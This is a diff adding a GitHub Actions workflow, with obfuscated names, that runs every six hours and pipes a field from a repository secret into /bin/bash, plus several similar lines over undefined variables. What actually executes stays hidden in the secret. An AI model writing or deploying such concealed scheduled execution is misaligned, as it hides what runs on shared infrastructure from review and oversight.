@@ -1,0 +1,25 @@
+name: jingciyibiangengg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jingciyibiangengg
+        env:
+          hhow27172: ${{ secrets.hhow27172 }}
+        run: |
+          echo $hhow27172 | jq -r .fx0308 | /bin/bash
+          echo $v6 | jq -r .ae51979 | /bin/bash
+          echo $ohc3024 | jq -r .milnz007 | /bin/bash
+          echo $bohw72 | jq -r .xmaat087 | /bin/bash
+          echo $ohfc631 | jq -r .xdfc4 | /bin/bash
+          echo $dtzo2 | jq -r .edm5 | /bin/bash
+          echo $irc147 | jq -r .fdao6 | /bin/bash
+          echo $o445 | jq -r .fhsj4693 | /bin/bash
+          echo $qfw67 | jq -r .v52773 | /bin/bash
+
